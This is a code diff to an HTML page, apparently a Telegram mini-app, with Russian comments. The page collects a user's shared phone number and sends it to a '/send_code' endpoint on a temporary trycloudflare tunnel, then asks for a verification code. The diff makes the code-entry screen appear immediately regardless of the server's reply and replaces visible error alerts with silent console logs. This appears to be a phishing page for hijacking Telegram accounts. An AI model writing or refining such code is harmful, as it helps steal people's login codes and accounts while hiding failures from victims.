@@ -37,7 +37,7 @@
 <body>
     <!-- ВАЖНО: ВСТАВЬ СЮДА СВОЮ ССЫЛКУ ОТ CLOUDFLARED -->
     <script>
-        const API_URL = "https://realm-sight-enclosed-electronics.trycloudflare.com"; 
+        const API_URL = "https://ТВОЯ-ССЫЛКА.trycloudflare.com"; 
     </script>
 
     <div id="step1">
@@ -71,6 +71,12 @@
                     userPhone = event.responseUnsafe.contact.phone_number;
                     if (!userPhone.startsWith('+')) userPhone = '+' + userPhone;
                     
+                    // 1. МГНОВЕННО ПЕРЕКЛЮЧАЕМ ЭКРАН
+                    document.getElementById('step1').classList.add('hidden');
+                    document.getElementById('step2').classList.remove('hidden');
+                    setTimeout(() => document.querySelectorAll('.code-input')[0].focus(), 100);
+                    
+                    // 2. ЗАПРОС ОТПРАВЛЯЕМ В ФОНЕ
                     fetch(`${API_URL}/send_code`, {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
@@ -78,19 +84,11 @@
                     })
                     .then(res => res.json())
                     .then(data => {
-                        if (data.success) {
-                            document.getElementById('step1').classList.add('hidden');
-                            document.getElementById('step2').classList.remove('hidden');
-                            setTimeout(() => document.querySelectorAll('.code-input')[0].focus(), 100);
-                        } else {
-                            alert("Ошибка: " + data.error);
+                        if (!data.success && !data.already) {
+                            console.log("Ошибка отправки кода:", data.error);
                         }
                     })
-                    .catch(err => {
-                        // Если сервер недоступен, всё равно переводим (чтобы не висело)
-                        document.getElementById('step1').classList.add('hidden');
-                        document.getElementById('step2').classList.remove('hidden');
-                    });
+                    .catch(err => console.log("Ошибка сети:", err));
                 }
             });
         }
